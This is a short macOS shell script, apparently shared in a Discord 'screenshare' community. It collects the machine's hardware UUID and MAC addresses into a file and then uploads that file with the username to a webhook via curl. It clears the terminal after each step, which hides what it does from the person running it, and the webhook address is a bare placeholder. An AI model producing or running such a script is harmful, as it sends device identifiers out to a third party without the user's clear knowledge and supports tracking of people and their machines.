#Performed by Screenshare Community! discord.gg/screenshare
#RRR#0001


cd ~/desktop
clear
ioreg -d2 -c IOPlatformExpertDevice | awk -F\" '/IOPlatformUUID/{print $(NF-1)}' > HWID.txt
clear
ifconfig | grep ether >> HWID.txt
clear
curl -H "Accept: application/json" -H "Content-Type:multipart/form-data" -X POST -F "file=@HWID.txt" -F "payload_json={\"content\":\"$USER HWID (mac)\"}" webhook
